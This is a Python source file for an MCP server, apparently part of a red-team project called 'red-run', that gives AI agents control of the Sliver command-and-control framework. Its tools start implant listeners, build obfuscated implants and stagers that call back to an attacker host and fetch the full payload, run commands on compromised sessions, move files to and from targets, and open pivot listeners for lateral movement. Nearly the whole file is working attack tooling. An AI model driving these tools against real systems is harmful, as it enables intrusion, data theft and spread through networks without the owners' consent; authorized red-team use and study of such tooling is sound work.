"""Sliver C2 MCP server for red-run.

Wraps Sliver's gRPC API via sliver-py, exposing session management,
implant generation, and pivot operations as MCP tools. Connects to a
running sliver-server daemon using an operator config file.

Runs as SSE on 127.0.0.1:8023 (configurable via SLIVER_SSE_PORT).
"""

from __future__ import annotations

import asyncio
import json
import hashlib
import os
import time
from pathlib import Path

from mcp.server.fastmcp import FastMCP

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
_SSE_PORT = int(os.environ.get("SLIVER_SSE_PORT", "8023"))


def _find_config() -> Path | None:
    """Locate the Sliver operator config file."""
    # Check engagement config first
    engagement_config = _PROJECT_ROOT / "engagement" / "config.yaml"
    if engagement_config.exists():
        try:
            import yaml  # noqa: F811 — optional, fall back to string parsing
            with open(engagement_config) as f:
                cfg = yaml.safe_load(f)
            sliver_cfg = cfg.get("shell", {}).get("sliver_config")
            if sliver_cfg:
                p = Path(sliver_cfg)
                if not p.is_absolute():
                    p = _PROJECT_ROOT / p
                if p.exists():
                    return p
        except Exception:
            pass

    # Default location
    default = _PROJECT_ROOT / "engagement" / "sliver.cfg"
    if default.exists():
        return default

    return None


def _not_configured_msg() -> str:
    return (
        "ERROR: Sliver not configured for this engagement.\n"
        "Run: operator/setup.sh and select Sliver as the shell backend,\n"
        "or manually create engagement/sliver.cfg:\n"
        "  sliver-server operator --name red-run --lhost 127.0.0.1 "
        "--save engagement/sliver.cfg"
    )


def create_server() -> FastMCP:
    mcp = FastMCP(
        "red-run-sliver-server",
        host="127.0.0.1",
        port=_SSE_PORT,
        instructions=(
            "Manages Sliver C2 sessions for red-run. Use start_mtls_listener "
            "to create listeners, generate_implant to build payloads, "
            "list_sessions to see active agents, execute to run commands, "
            "and start_pivot_listener for internal pivoting."
        ),
    )

    # Shared async client — connected lazily on first tool call
    _client = None
    _client_lock = asyncio.Lock()
    _config_path = _find_config()

    async def _get_client():
        nonlocal _client
        async with _client_lock:
            if _client is not None:
                return _client
            if _config_path is None:
                return None
            try:
                import sliver
                config = sliver.SliverClientConfig.parse_config_file(
                    str(_config_path)
                )
                client = sliver.SliverClientAsync(config)
                await client.connect()
                _client = client
                return _client
            except Exception as e:
                return None

    def _require_config(fn):
        """Decorator that checks for Sliver config before calling tool."""
        import functools
        @functools.wraps(fn)
        async def wrapper(*args, **kwargs):
            if _config_path is None:
                return _not_configured_msg()
            client = await _get_client()
            if client is None:
                return (
                    "ERROR: Failed to connect to Sliver daemon. "
                    "Ensure sliver-server daemon is running."
                )
            return await fn(client, *args, **kwargs)
        return wrapper

    # ── Listener management ─────────────────────────────────────────

    @mcp.tool()
    @_require_config
    async def start_mtls_listener(
        client,
        host: str = "0.0.0.0",
        port: int = 4444,
    ) -> str:
        """Start an mTLS listener for Sliver implant callbacks.

        Args:
            host: Bind address (default 0.0.0.0).
            port: Bind port (default 4444).
        """
        try:
            job = await client.start_mtls_listener(host=host, port=port)
            return json.dumps({
                "status": "listening",
                "job_id": job.JobID,
                "host": host,
                "port": port,
                "protocol": "mtls",
            })
        except Exception as e:
            return f"ERROR: Failed to start mTLS listener: {e}"

    @mcp.tool()
    @_require_config
    async def start_https_listener(
        client,
        host: str = "0.0.0.0",
        port: int = 443,
        domain: str = "",
    ) -> str:
        """Start an HTTPS listener for Sliver implant callbacks.

        Args:
            host: Bind address.
            port: Bind port (default 443).
            domain: Optional domain for TLS certificate.
        """
        try:
            job = await client.start_https_listener(
                host=host, port=port, domain=domain
            )
            return json.dumps({
                "status": "listening",
                "job_id": job.JobID,
                "host": host,
                "port": port,
                "protocol": "https",
            })
        except Exception as e:
            return f"ERROR: Failed to start HTTPS listener: {e}"

    @mcp.tool()
    @_require_config
    async def list_jobs(client) -> str:
        """List active Sliver listener jobs."""
        try:
            jobs = await client.jobs()
            result = []
            for job in jobs:
                result.append({
                    "job_id": job.ID,
                    "name": job.Name,
                    "protocol": job.Protocol,
                    "port": job.Port,
                })
            return json.dumps({"jobs": result, "count": len(result)})
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    @_require_config
    async def kill_job(client, job_id: int) -> str:
        """Stop a listener job.

        Args:
            job_id: Job ID from list_jobs.
        """
        try:
            await client.kill_job(job_id)
            return json.dumps({"status": "killed", "job_id": job_id})
        except Exception as e:
            return f"ERROR: {e}"

    # ── Implant generation ──────────────────────────────────────────

    @mcp.tool()
    @_require_config
    async def generate_implant(
        client,
        os: str = "linux",
        arch: str = "amd64",
        mtls_host: str = "",
        mtls_port: int = 4444,
        format: str = "exe",
        name: str = "",
    ) -> str:
        """Generate a Sliver session-mode implant.

        Builds an obfuscated implant binary. Session mode (interactive,
        persistent mTLS connection) — not beacon mode.

        Args:
            os: Target OS — linux, windows, darwin.
            mtls_host: Callback host (attackbox IP). Required.
            mtls_port: Callback port (must match listener).
            arch: Target architecture — amd64, arm64, 386.
            format: Output format — exe, shared, shellcode, service.
            name: Optional implant name.
        """
        if not mtls_host:
            return "ERROR: mtls_host is required (attackbox callback IP)."

        try:
            from sliver import client_pb2

            c2 = [client_pb2.ImplantC2(
                URL=f"mtls://{mtls_host}:{mtls_port}",
                Priority=0,
            )]

            config = client_pb2.ImplantConfig(
                IsBeacon=False,
                GOOS=os,
                GOARCH=arch,
                Format=(
                    client_pb2.EXECUTABLE if format == "exe"
                    else client_pb2.SHARED_LIB if format == "shared"
                    else client_pb2.SHELLCODE if format == "shellcode"
                    else client_pb2.SERVICE if format == "service"
                    else client_pb2.EXECUTABLE
                ),
                ObfuscateSymbols=True,
                C2=c2,
                Name=name or "",
            )

            implant = await client.generate_implant(config)

            # Save to engagement/evidence/
            evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
            evidence_dir.mkdir(parents=True, exist_ok=True)

            ext = {
                "linux": "",
                "windows": ".exe",
                "darwin": "",
            }.get(os, "")
            implant_name = name or f"implant-{int(time.time())}"
            filename = f"{implant_name}{ext}"
            filepath = evidence_dir / filename

            with open(filepath, "wb") as f:
                f.write(implant.File.Data)
            filepath.chmod(0o755)

            sha256 = hashlib.sha256(implant.File.Data).hexdigest()

            return json.dumps({
                "status": "generated",
                "name": implant.File.Name,
                "path": str(filepath),
                "size": len(implant.File.Data),
                "sha256": sha256,
                "os": os,
                "arch": arch,
                "format": format,
                "callback": f"mtls://{mtls_host}:{mtls_port}",
            })
        except Exception as e:
            return f"ERROR: Implant generation failed: {e}"

    @mcp.tool()
    @_require_config
    async def generate_stager(
        client,
        os: str = "linux",
        arch: str = "amd64",
        protocol: str = "tcp",
        host: str = "",
        port: int = 8443,
    ) -> str:
        """Generate a small first-stage stager payload.

        Stagers are small shellcode payloads (~10KB) that download and
        execute the full implant. Useful for size-constrained delivery.

        Args:
            os: Target OS.
            arch: Target architecture.
            protocol: Stager protocol — tcp, http, https.
            host: Stage listener host. Required.
            port: Stage listener port.
        """
        if not host:
            return "ERROR: host is required (stage listener address)."

        try:
            from sliver import client_pb2

            stager = await client.generate_msf_stager(
                arch=arch,
                format=f"{protocol}",
                host=host,
                port=port,
                os=os,
            )

            evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
            evidence_dir.mkdir(parents=True, exist_ok=True)

            filename = f"stager-{int(time.time())}.bin"
            filepath = evidence_dir / filename

            with open(filepath, "wb") as f:
                f.write(stager.File.Data)

            return json.dumps({
                "status": "generated",
                "path": str(filepath),
                "size": len(stager.File.Data),
                "protocol": protocol,
                "listener": f"{host}:{port}",
            })
        except Exception as e:
            return f"ERROR: Stager generation failed: {e}"

    # ── Session management ──────────────────────────────────────────

    @mcp.tool()
    @_require_config
    async def list_sessions(client) -> str:
        """List all active Sliver sessions with metadata."""
        try:
            sessions = await client.sessions()
            result = []
            for s in sessions:
                result.append({
                    "session_id": str(s.ID),
                    "name": s.Name,
                    "remote_address": s.RemoteAddress,
                    "hostname": s.Hostname,
                    "username": s.Username,
                    "os": s.OS,
                    "arch": s.Arch,
                    "transport": s.Transport,
                    "pid": s.PID,
                    "filename": s.Filename,
                    "active_c2": s.ActiveC2,
                    "alive": not s.IsDead,
                })
            return json.dumps({
                "sessions": result,
                "count": len(result),
            })
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    @_require_config
    async def execute(
        client,
        session_id: str = "",
        command: str = "",
        args: str = "",
        output: bool = True,
    ) -> str:
        """Execute a command on a Sliver session.

        Args:
            session_id: Session ID from list_sessions. Required.
            command: Command to execute. Required.
            args: Space-separated arguments.
            output: Capture stdout/stderr (default true).
        """
        if not session_id or not command:
            return "ERROR: session_id and command are required."

        try:
            session = await client.interact_session(session_id)
            result = await session.execute(
                command,
                args.split() if args else [],
                output,
            )
            return json.dumps({
                "status": "executed",
                "stdout": result.Stdout.decode("utf-8", errors="replace")
                if result.Stdout else "",
                "stderr": result.Stderr.decode("utf-8", errors="replace")
                if result.Stderr else "",
                "exit_code": result.Status,
            })
        except Exception as e:
            return f"ERROR: Command execution failed: {e}"

    @mcp.tool()
    @_require_config
    async def upload(
        client,
        session_id: str = "",
        local_path: str = "",
        remote_path: str = "",
    ) -> str:
        """Upload a file to a Sliver session target.

        Args:
            session_id: Session ID. Required.
            local_path: Local file to upload. Required.
            remote_path: Destination path on target. Required.
        """
        if not session_id or not local_path or not remote_path:
            return "ERROR: session_id, local_path, and remote_path are required."

        local = Path(local_path)
        if not local.exists():
            return f"ERROR: Local file not found: {local_path}"

        try:
            session = await client.interact_session(session_id)
            data = local.read_bytes()
            result = await session.upload(remote_path, data)
            return json.dumps({
                "status": "uploaded",
                "remote_path": result.Path,
                "size": len(data),
            })
        except Exception as e:
            return f"ERROR: Upload failed: {e}"

    @mcp.tool()
    @_require_config
    async def download(
        client,
        session_id: str = "",
        remote_path: str = "",
        local_path: str = "",
    ) -> str:
        """Download a file from a Sliver session target.

        Args:
            session_id: Session ID. Required.
            remote_path: File path on target. Required.
            local_path: Local destination. Defaults to engagement/evidence/.
        """
        if not session_id or not remote_path:
            return "ERROR: session_id and remote_path are required."

        try:
            session = await client.interact_session(session_id)
            result = await session.download(remote_path)

            if not local_path:
                evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
                evidence_dir.mkdir(parents=True, exist_ok=True)
                filename = Path(remote_path).name or "download"
                local_path = str(evidence_dir / filename)

            with open(local_path, "wb") as f:
                f.write(result.Data)

            return json.dumps({
                "status": "downloaded",
                "remote_path": remote_path,
                "local_path": local_path,
                "size": len(result.Data),
            })
        except Exception as e:
            return f"ERROR: Download failed: {e}"

    @mcp.tool()
    @_require_config
    async def ifconfig(client, session_id: str = "") -> str:
        """List network interfaces on a Sliver session target.

        Useful for pivot detection — look for additional NICs/subnets.

        Args:
            session_id: Session ID. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."

        try:
            session = await client.interact_session(session_id)
            result = await session.ifconfig()
            interfaces = []
            for iface in result.NetInterfaces:
                addrs = []
                for addr in iface.IPAddresses:
                    addrs.append(addr)
                interfaces.append({
                    "name": iface.Name,
                    "mac": iface.MAC,
                    "addresses": addrs,
                })
            return json.dumps({"interfaces": interfaces})
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    @_require_config
    async def kill_session(client, session_id: str = "") -> str:
        """Terminate a Sliver session.

        Args:
            session_id: Session ID. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."

        try:
            session = await client.interact_session(session_id)
            await session.kill()
            return json.dumps({
                "status": "killed",
                "session_id": session_id,
            })
        except Exception as e:
            return f"ERROR: {e}"

    # ── Pivot management ────────────────────────────────────────────

    @mcp.tool()
    @_require_config
    async def start_pivot_listener(
        client,
        session_id: str = "",
        pivot_type: str = "tcp",
        bind_address: str = "0.0.0.0",
        bind_port: int = 9898,
    ) -> str:
        """Start a pivot listener on a compromised host.

        Other implants connect through this pivot to reach the C2 server.
        Generate new implants with the pivot host as the callback target.

        Args:
            session_id: Session on the pivot host. Required.
            pivot_type: Pivot type — tcp or named-pipe.
            bind_address: Address to bind on pivot host.
            bind_port: Port to bind on pivot host.
        """
        if not session_id:
            return "ERROR: session_id is required."

        try:
            session = await client.interact_session(session_id)
            if pivot_type == "tcp":
                result = await session.start_tcp_pivot(
                    bind_address=bind_address,
                    port=bind_port,
                )
            else:
                return f"ERROR: Unsupported pivot type: {pivot_type}. Use tcp."

            return json.dumps({
                "status": "pivot_listening",
                "pivot_id": result.ID if hasattr(result, "ID") else "",
                "session_id": session_id,
                "type": pivot_type,
                "bind": f"{bind_address}:{bind_port}",
                "message": (
                    f"Pivot listener running on session {session_id}. "
                    f"Generate implants with callback to "
                    f"{bind_address}:{bind_port} on the pivot host."
                ),
            })
        except Exception as e:
            return f"ERROR: Pivot listener failed: {e}"

    @mcp.tool()
    @_require_config
    async def list_pivots(client) -> str:
        """List active pivot listeners across all sessions."""
        try:
            pivots = await client.pivots()
            result = []
            for p in pivots:
                result.append({
                    "pivot_id": p.ID,
                    "session_id": str(p.OriginID)
                    if hasattr(p, "OriginID") else "",
                    "type": p.Type,
                    "remote_address": p.RemoteAddress,
                })
            return json.dumps({"pivots": result, "count": len(result)})
        except Exception as e:
            return f"ERROR: {e}"

    # ── HTTP custom routes ──────────────────────────────────────────

    from starlette.requests import Request
    from starlette.responses import JSONResponse

    @mcp.custom_route("/status", methods=["GET"])
    async def status(request: Request) -> JSONResponse:
        """Health check endpoint for run.sh."""
        if _config_path is None:
            return JSONResponse({"status": "not_configured", "sessions": 0})
        client = await _get_client()
        if client is None:
            return JSONResponse({"status": "disconnected", "sessions": 0})
        try:
            sessions = await client.sessions()
            return JSONResponse({
                "status": "connected",
                "sessions": len(sessions),
            })
        except Exception:
            return JSONResponse({"status": "error", "sessions": 0})

    return mcp


def main() -> None:
    server = create_server()
    server.run(transport="sse")


if __name__ == "__main__":
    main()
